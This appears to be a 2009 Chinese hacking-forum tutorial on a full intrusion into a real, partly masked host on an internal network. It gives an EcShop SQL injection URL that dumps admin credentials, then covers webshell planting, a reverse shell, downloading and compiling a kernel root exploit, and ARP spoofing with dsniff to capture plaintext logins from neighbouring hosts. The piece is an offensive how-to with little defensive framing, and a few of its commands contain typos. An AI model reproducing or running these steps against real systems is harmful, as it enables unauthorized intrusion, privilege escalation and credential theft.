@@ -1,0 +1,187 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+Linux下渗透嗅探术
+D8888D主贴内容-------------------------------------------------------
+内网渗透在攻击层面，其实更趋向于社工和常规漏洞检测的结合，为了了解网内防护措施的设置是通过一步步的刺探和经验积累，有时判断出错，也能进入误区。但是如果能在网内进行嗅探，则能事半功倍，处于一个对网内设置完全透明的状态。本文将从一个注点引发的突破，到控制整个内网的全过程来跟大家讨论，内网的渗透嗅探术和安全防护一些内容。
+
+在寻找突破时，更多的是从应用服务来，而应用服务最直观的信息采集，就是端口扫描，不同的应用，开放的服务不一样。所以，在对网络进行信息收集时，大概分为这样两步： 端口探测，程序指纹分析。在端口探测方面，个人喜欢用SuperScan来快速对网段里的应用进行判断，如图：
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0912/0912141127a525fea714d6999f.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MjUwOHw0ZjEzZTM2ZnwxMjg2NDgxNzExfGE4NmRKbEZnOSt2MWttMC94RzBSYTlYZ2lBUEIyc2FNR2RtN2FEZ3VSSm83cDBR&nothumb=yes]链接标记下载[/url] (62.14 KB)
+
+2009-12-14 11:27
+在掌握端口信息后，就要对服务应用程序的指纹进行分析，主要包括版本号、已知的漏洞信息、常规配置信息、针对此应用流行的攻击方法等。本文试着对网内一台提供WEB服务的主机作为突破口，提交一个畸形的请求，如图：
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0912/0912141127c5c6a0addd329118.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MjUwOXxjZTY0NDNhM3wxMjg2NDgxNzExfGE4NmRKbEZnOSt2MWttMC94RzBSYTlYZ2lBUEIyc2FNR2RtN2FEZ3VSSm83cDBR&nothumb=yes]链接标记下载[/url] (92.53 KB)
+
+2009-12-14 11:27
+从上图可以读取以下信息：
+系统类型：Fedora
+应用程序：apache/2.2.4
+以上只是很简单的手工对程序指纹进行分析，当然在针对web应用的扫描器，还有很多，比较常用的wvs、appscan等。用轻量级的”wwwwscan”来扫描：
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0912/0912141129391589aeae669bba.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MjUxMHw3ODE1ZDA5N3wxMjg2NDgxNzExfGE4NmRKbEZnOSt2MWttMC94RzBSYTlYZ2lBUEIyc2FNR2RtN2FEZ3VSSm83cDBR&nothumb=yes]链接标记下载[/url] (39.93 KB)
+
+2009-12-14 11:29
+由扫描的结果可以看到，与手工探测的结果是一致的。
+
+通上面简单的信息收集后，可以了解到网站架构是apache+mysql+php,直接请求URL：[url=http://61.67.xx.116/htdocs/]链接标记http://61.67.xx.116/htdocs/[/url]
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0912/09121411295dec95b21ea5a4bb.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MjUxMXxmNTdlOGYxOXwxMjg2NDgxNzExfGE4NmRKbEZnOSt2MWttMC94RzBSYTlYZ2lBUEIyc2FNR2RtN2FEZ3VSSm83cDBR&nothumb=yes]链接标记下载[/url] (50.05 KB)
+
+2009-12-14 11:29
+发现此站是EcShop架构的站点，其使用的版本信息是V2.5.0。EcShop的版本是存在许多的注入点的。其中user.php文件有个注入漏洞，直接请求URL如下：
+[url=http://61.67.xx.116/htdocs/user.php?act=order_query&order_sn=]链接标记http://61.67.xx.116/htdocs/user.php?act=order_query&order_sn=[/url]’ union select 1,2,3,4,5,6,concat(user_name,0×7c,password,0×7c,email),8 from ecs_admin_user/*
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0912/0912141130568cf6553797da38.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MjUxMnxlMTZlY2YyNnwxMjg2NDgxNzExfGE4NmRKbEZnOSt2MWttMC94RzBSYTlYZ2lBUEIyc2FNR2RtN2FEZ3VSSm83cDBR&nothumb=yes]链接标记下载[/url] (56.74 KB)
+
+2009-12-14 11:30
+获取管理员帐号和密码，ECShop使用的是MD5加密，直接解密。原来密码是admin，有点意料之外。访问管理后台，修改模版处，插入一句木马，即可得到WEBSEHLL，如图：
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0912/0912141131d96246bea644612d.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MjUxM3xlY2E0OWEyMnwxMjg2NDgxNzExfGE4NmRKbEZnOSt2MWttMC94RzBSYTlYZ2lBUEIyc2FNR2RtN2FEZ3VSSm83cDBR&nothumb=yes]链接标记下载[/url] (117.46 KB)
+
+2009-12-14 11:31
+在获取WEBshell权限后，就需要对系统进行分析，查找Exp了。执行命令如下：
+#uname –a
+
+返回的信息是“Linux fedora 2.6.20-1.2962.fc6 ”，Linux内核是2.6.20的。
+在提权时，要用到gcc进行编译，刺探一下系统有没有安装，执行命令，
+#gcc –help
+
+发现可以运行gcc,并且系统管理员没对使用shell和gcc进行限制，在也是个安全缺失。
+
+在寻找本地提权利用程序时，通常是根据系统版本来进行，应用程序的本地提权也是一样的。在网上就有可供查询的网站，比如[url=http://www.milw0rm.com/]链接标记http://www.milw0rm.com/[/url]网站如图：
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0912/09121411323118cbd249f8fe2a.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MjUxNHxhODYxN2Y4NnwxMjg2NDgxNzExfGE4NmRKbEZnOSt2MWttMC94RzBSYTlYZ2lBUEIyc2FNR2RtN2FEZ3VSSm83cDBR&nothumb=yes]链接标记下载[/url] (83.02 KB)
+
+2009-12-14 11:32
+发现可利用的漏洞还真不少。
+
+本地提权是需要个交互式的shell的。在本机监听端口如下：
+
+利用WebShell自带的反弹功能直接连接本地的12345端口并返回shell如图：
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0912/09121411332592907f2ee90ffa.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MjUxNXw2NjQ0NmIwOXwxMjg2NDgxNzExfGE4NmRKbEZnOSt2MWttMC94RzBSYTlYZ2lBUEIyc2FNR2RtN2FEZ3VSSm83cDBR&nothumb=yes]链接标记下载[/url] (10.6 KB)
+
+2009-12-14 11:33
+连接成功后，就能得到一个apache用户的shell
+，但有时如果不能交互时，可以直接执行，
+# python –c ‘impotr pty;pty.spawn(“/bin/sh”);’
+来得到交互的Shell,一般的系统都默认安装python
+如图：
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0912/09121411330edca1798db9af8e.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MjUxNnxlYmQxMzFiM3wxMjg2NDgxNzExfGE4NmRKbEZnOSt2MWttMC94RzBSYTlYZ2lBUEIyc2FNR2RtN2FEZ3VSSm83cDBR&nothumb=yes]链接标记下载[/url] (29.92 KB)
+
+2009-12-14 11:33
+提示成功了，可以新建个目录用来存放提权的工具。
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0912/0912141134147c13ea84145e90.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MjUxN3wzYmRjYWNiMnwxMjg2NDgxNzExfGE4NmRKbEZnOSt2MWttMC94RzBSYTlYZ2lBUEIyc2FNR2RtN2FEZ3VSSm83cDBR&nothumb=yes]链接标记下载[/url] (37.55 KB)
+
+2009-12-14 11:34
+在Linux提权大致可分为，第三方软件漏洞、本地信任特性、内核溢出等，比较常用的溢出率高的，当属内核了。用Wget下载溢出源码，用到的漏洞是Linux vmsplice Local Root Exploit
+，成功率蛮高的，gcc编译，执行，如图：
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0912/0912141135c130b45693f43061.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MjUxOHxkYjYwNGZjZHwxMjg2NDgxNzExfGE4NmRKbEZnOSt2MWttMC94RzBSYTlYZ2lBUEIyc2FNR2RtN2FEZ3VSSm83cDBR&nothumb=yes]链接标记下载[/url] (25.79 KB)
+
+2009-12-14 11:35
+成功获取root权限，在选择溢出利用程序时，有时需要进行多次测试。
+
+什么是Sniffer，sniffer是利用截获目的的计算机通信，通过分析截获的数据，提取敏感信息的工具。但其通过什么方法来截获数据呢？在此之前得解释一下arp（Address Rrsolution Protocol）协议,即地址解析协议，它位于TCP/IP协议栈中的低层协议，负责将某个IP地址解析成对应的MAC地址。它靠维持在内存中保存的一张表来使IP得以在网络上被目标机器应答。在数据传送时，IP包里就有源IP地址、源MAC地址、目标IP地址，如果在ARP表中有相对应的MAC地点，那么根据最优选择法，直接访问，如果，没有对应的地址，就要广播出去，在网内寻找对应的地址，如果对方的IP地址和发出的目标IP地址相同，那么对方会发送MAC地址给源主机，，而此时，如果攻击者也接听到发送的IP地址，它就会仿冒目标主机的IP地址，然后返回自己的主机的MAC地址给源主机，因为源主机发送的IP包没有包括目标主机的MAC地址，而ARP表里面又没有目标IP和目标MAC地址的对应表，就会接受攻击者的MAC而选择与其通信，所以就此产生了ARP欺骗。在系统刚启动时，可以在DOS下输入命令“arp -a”来查看本机arp缓存表的内容，如图：
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0912/0912141135cbfefa8f630efb80.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MjUxOXw0MGZkMzhkNHwxMjg2NDgxNzExfGE4NmRKbEZnOSt2MWttMC94RzBSYTlYZ2lBUEIyc2FNR2RtN2FEZ3VSSm83cDBR&nothumb=yes]链接标记下载[/url] (20.89 KB)
+
+2009-12-14 11:35
+我们来与IP192.168.0.5进行通信，通信后arp缓存表就会有这样一条MAC地址和IP对应的记录。如图：
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0912/0912141136a2ba37442f61559a.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MjUyMHw4NWI0MjA4ZXwxMjg2NDgxNzExfGE4NmRKbEZnOSt2MWttMC94RzBSYTlYZ2lBUEIyc2FNR2RtN2FEZ3VSSm83cDBR&nothumb=yes]链接标记下载[/url] (56.04 KB)
+
+2009-12-14 11:36
+在本机多了条缓存中的IP和MAC的对应纪录。
+
+Dsniff是一个著名的网络嗅探工具包，其开发者是Dug Song，其开发的本意是用来揭示网络通信的不安全性，方便网络管理员对自己网络的审计，当然也包括渗透测试，其安装包里某此工具，充分揭示了协议的不安全性。作为一个工具集，Dsniff包括的工具大致分为四类：
+一、 纯粹被动地进行网络活动监视的工具，包括：dsniff、filesnarf、mailsnaf、msgsnarf、urlsnarf、webspy
+二、 针对SSH和SSL的MITM“攻击”工具，包括sshmitm和webmitm
+三、 发起主动欺骗的工具，包括：arpspoof、dnsspof、macof
+四、 其它工具，包括tcpkill、tcpnice
+
+Dsniff的官方下载：[url=http://www.monkey.org/~dugsong/dsniff/]链接标记www.monkey.org/~dugsong/dsniff/[/url] 这个是源码包，解压后可以看下README,提示需要五个软件的支持：openssl、Berkeley_db、libnet、libpca、libnids
+下载地址如下：
+Berkeley_db: [url=http://www.oracle.com/technology/software/products/berkeley-db/index.html]链接标记http://www.oracle.com/technology ... keley-db/index.html[/url]
+libpcap: [url=http://www.tcpdump.org/release/libpcap-1.0.0.tar.gz]链接标记http://www.tcpdump.org/release/libpcap-1.0.0.tar.gz[/url]
+[url=ftp://rpmfind.net/linux/epel/5/i386/dsniff-2.4-0.3.b1.el5.i386.rpm]链接标记ftp://rpmfind.net/linux/epel/5/i ... 0.3.b1.el5.i386.rpm[/url]
+[url=ftp://rpmfind.net/linux/epel/5/i386/libnet-1.1.4-1.el5.i386.rpm]链接标记ftp://rpmfind.net/linux/epel/5/i386/libnet-1.1.4-1.el5.i386.rpm[/url]
+[url=ftp://rpmfind.net/linux/epel/5/i386/libnids-1.23-1.el5.i386.rpm]链接标记ftp://rpmfind.net/linux/epel/5/i386/libnids-1.23-1.el5.i386.rpm[/url]
+系统一般默认都有安装openssl、libpcap。 一、        Tar包安装
+
+如果下载的是源包，文件如下：openssl-0.9.7i.tar.gz、libnids-1.18.tar.gz、libpcap-0.7.2.tar.gz、libnet-1.0.2a.tar.gz、Berkeley db-4.7.25.tar.gz
+
+a)        安装openssl
+
+用tar解压软件包手，执行三条命令
+
+#./config
+
+#make
+
+#make install
+
+b)        安装libpcap
+
+#./config
+
+#make
+
+#make install
+
+c)        安装libnet
+
+#./config
+
+#make
+
+#make install
+
+d)        安装libnids
+
+#./config
+
+#make
+
+#make install
+
+e)        安装libnids
+
+#./config
+
+#make
+
+#make install
+
+f)        安装Berkeley DB
+
+#.cd build_unix
+
+#../dist/configure
+
+#make
+
+#make install
+
+g)        安装dsniff
+
+#./configure
+
+#make
+
+#make install
+
+程序安装好后，先查看一下网卡信息，然后开启服务器IP转发，命令如下：
+
+# echo "1" &gt; /proc/sys/net/ipv4/ip_forward
+复制代码先来双向欺骗，用到arpspoof，其命令是：
+#arp –t 网关 欺骗主机IP
+如图：
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0912/09121411390d46fcbd59998886.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MjUyMXwxNTBkMjhkMXwxMjg2NDgxNzExfGE4NmRKbEZnOSt2MWttMC94RzBSYTlYZ2lBUEIyc2FNR2RtN2FEZ3VSSm83cDBR&nothumb=yes]链接标记下载[/url] (52.86 KB)
+
+2009-12-14 11:39
+arpspoof已经开始工作了，可以用tcpdump查看一下被攻击主机是否有数据经过
+命令如下：
+#tcpdump –I eth0 host 61.67.x.115
+如图：
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0912/0912141139d861420b80dfa655.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MjUyMnxjNmY1ZTZlYnwxMjg2NDgxNzExfGE4NmRKbEZnOSt2MWttMC94RzBSYTlYZ2lBUEIyc2FNR2RtN2FEZ3VSSm83cDBR&nothumb=yes]链接标记下载[/url] (59.47 KB)
+
+2009-12-14 11:39
+有数据交换，说明欺骗的比较成功，然后用Dsniff开始嗅探目标主机，命令如下：
+#Dsniff –c –f /etc/dsniff/dsniff.services
+这个dsniff.services自然就是保存端口和服务对应关系的文件，如需要保存到文件，需加-w filename数据全是明文传送的。所以数据分析完全能用肉眼发现，如图：
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0912/0912141140a21ab2143257db52.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MjUyM3xkZThhZjFhZHwxMjg2NDgxNzExfGE4NmRKbEZnOSt2MWttMC94RzBSYTlYZ2lBUEIyc2FNR2RtN2FEZ3VSSm83cDBR&nothumb=yes]链接标记下载[/url] (16.18 KB)
+
+2009-12-14 11:40
+从这条数据可以看到HTTP登录和FTP登录信息，帐号和密码全是明文的。而经过测试，通过FTP上传的目录正是WEB目录，获取WEBShell权限，继续提权即可控制主机。Linux下的嗅探，其实更容易一些，在最近爆出的高危本地提权，不知道有多少台主机沦陷呢？在攻与防的游戏里，系统管理员往往显得如此的无助。
